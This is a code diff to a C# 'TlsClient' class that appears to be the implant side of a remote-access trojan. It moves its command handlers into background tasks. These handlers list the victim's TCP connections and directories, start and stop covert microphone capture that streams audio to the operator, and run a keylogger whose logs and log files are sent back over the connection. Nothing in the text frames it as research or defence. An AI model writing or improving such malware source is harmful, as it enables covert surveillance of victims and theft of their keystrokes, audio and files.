@@ -260,11 +260,11 @@ internal class TlsClient : IDisposable
 
                 // ── TCP Manager ─────────────────────────────────────
                 case PacketType.TcpGetList:
-                    _ = WritePacketAsync(new Packet
+                    _ = Task.Run(async () => await WritePacketAsync(new Packet
                     {
                         Type = PacketType.TcpListResult,
                         Data = TcpManagerFeature.GetList()
-                    }, ct);
+                    }, CancellationToken.None));
                     break;
 
                 case PacketType.TcpClose:
@@ -290,11 +290,12 @@ internal class TlsClient : IDisposable
                 // ── File Manager ─────────────────────────────────────
                 case PacketType.FmList:
                     var fmList = JsonSerializer.Deserialize(packet.Data, SeroJson.Default.FmDownloadDataStub);
-                    _ = WritePacketAsync(new Packet
+                    var fmListPath = fmList?.Path ?? "";
+                    _ = Task.Run(async () => await WritePacketAsync(new Packet
                     {
                         Type = PacketType.FmListResult,
-                        Data = FileManagerFeature.ListDirectory(fmList?.Path ?? "")
-                    }, ct);
+                        Data = FileManagerFeature.ListDirectory(fmListPath)
+                    }, CancellationToken.None));
                     break;
 
                 case PacketType.FmDownload:
@@ -377,12 +378,15 @@ internal class TlsClient : IDisposable
                 case PacketType.MicStart:
                     var micStart = JsonSerializer.Deserialize(packet.Data, SeroJson.Default.MicStartDataStub);
                     if (micStart != null)
-                        MicrophoneFeature.Start(micStart.DeviceIndex, micStart.SampleRate,
-                            async data => await WritePacketAsync(new Packet { Type = PacketType.MicData, Data = data }, CancellationToken.None));
+                    {
+                        var micStartCopy = micStart;
+                        _ = Task.Run(() => MicrophoneFeature.Start(micStartCopy.DeviceIndex, micStartCopy.SampleRate,
+                            async data => await WritePacketAsync(new Packet { Type = PacketType.MicData, Data = data }, CancellationToken.None)));
+                    }
                     break;
 
                 case PacketType.MicStop:
-                    MicrophoneFeature.Stop();
+                    _ = Task.Run(() => MicrophoneFeature.Stop());
                     break;
 
                 // ── TikTok ───────────────────────────────────────────
@@ -661,50 +665,60 @@ internal class TlsClient : IDisposable
                     break;
 
                 case PacketType.KeyloggerStop:
-                    KeyloggerFeature.Stop();
+                    _ = Task.Run(() => KeyloggerFeature.Stop());
                     break;
 
                 case PacketType.KeyloggerGetLogs:
-                    var kLogs = KeyloggerFeature.GetAndClearLogs();
-                    _ = WritePacketAsync(new Packet
+                    _ = Task.Run(async () =>
                     {
-                        Type = PacketType.KeyloggerLogsResult,
-                        Data = JsonSerializer.Serialize(
-                            new KeyloggerLogsResultStub { Logs = kLogs, IsRunning = KeyloggerFeature.IsRunning },
-                            SeroJson.Default.KeyloggerLogsResultStub)
-                    }, ct);
+                        var kLogs = KeyloggerFeature.GetAndClearLogs();
+                        await WritePacketAsync(new Packet
+                        {
+                            Type = PacketType.KeyloggerLogsResult,
+                            Data = JsonSerializer.Serialize(
+                                new KeyloggerLogsResultStub { Logs = kLogs, IsRunning = KeyloggerFeature.IsRunning },
+                                SeroJson.Default.KeyloggerLogsResultStub)
+                        }, CancellationToken.None);
+                    });
                     break;
 
                 case PacketType.KeyloggerClear:
-                    KeyloggerFeature.GetAndClearLogs();
+                    _ = Task.Run(() => KeyloggerFeature.GetAndClearLogs());
                     break;
 
                 case PacketType.KeyloggerListFiles:
-                    var klFiles = KeyloggerFeature.GetLogFiles();
-                    _ = WritePacketAsync(new Packet
+                    _ = Task.Run(async () =>
                     {
-                        Type = PacketType.KeyloggerFilesResult,
-                        Data = JsonSerializer.Serialize(
-                            new KeyloggerFilesResultStub
-                            {
-                                Files = klFiles.ToList(),
-                                IsRunning = KeyloggerFeature.IsRunning
-                            }, SeroJson.Default.KeyloggerFilesResultStub)
-                    }, ct);
+                        var klFiles = KeyloggerFeature.GetLogFiles();
+                        await WritePacketAsync(new Packet
+                        {
+                            Type = PacketType.KeyloggerFilesResult,
+                            Data = JsonSerializer.Serialize(
+                                new KeyloggerFilesResultStub
+                                {
+                                    Files = klFiles.ToList(),
+                                    IsRunning = KeyloggerFeature.IsRunning
+                                }, SeroJson.Default.KeyloggerFilesResultStub)
+                        }, CancellationToken.None);
+                    });
                     break;
 
                 case PacketType.KeyloggerGetFile:
                     var klGf = JsonSerializer.Deserialize(packet.Data, SeroJson.Default.KeyloggerGetFileStub);
                     if (klGf != null)
                     {
-                        var content = KeyloggerFeature.GetFileContent(klGf.Filename);
-                        _ = WritePacketAsync(new Packet
+                        var klGfName = klGf.Filename;
+                        _ = Task.Run(async () =>
                         {
-                            Type = PacketType.KeyloggerFileContent,
-                            Data = JsonSerializer.Serialize(
-                                new KeyloggerFileContentStub { Filename = klGf.Filename, Content = content },
-                                SeroJson.Default.KeyloggerFileContentStub)
-                        }, ct);
+                            var content = KeyloggerFeature.GetFileContent(klGfName);
+                            await WritePacketAsync(new Packet
+                            {
+                                Type = PacketType.KeyloggerFileContent,
+                                Data = JsonSerializer.Serialize(
+                                    new KeyloggerFileContentStub { Filename = klGfName, Content = content },
+                                    SeroJson.Default.KeyloggerFileContentStub)
+                            }, CancellationToken.None);
+                        });
                     }
                     break;
 
